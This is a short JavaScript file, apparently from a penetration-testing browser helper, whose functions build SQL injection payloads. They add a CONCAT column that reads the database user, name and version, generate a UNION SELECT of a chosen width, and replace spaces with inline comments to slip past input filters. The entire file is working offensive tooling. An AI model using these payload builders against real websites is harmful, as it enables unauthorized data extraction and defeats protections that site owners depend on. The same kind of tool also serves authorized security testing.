/**
 * SQL-Related Functions
 */

// add basic SQL info column to the payload
function basicInfoColum()
{
    addToPayload( 'CONCAT(user(),"::",database(),"::",version())' );
}


// add SQL union select statement to the payload
function unionSelectStatement()
{
    let out = 'UNION SELECT ';
    
    exec( 'prompt( "How many columns?", 10 )' ).then( columns => {
        columns = parseInt( columns );

        for( let i=1; i<=columns; i++ )
            out += i + ',';

        out = out.slice( 0, -1 );
        addToPayload( out );
    });
}


// replace spaces in payload with inline SQL comments
function spacesToInlineComments()
{
    payloadInput.value = payloadInput.value.replace( /\s+/g, '/**/' );
}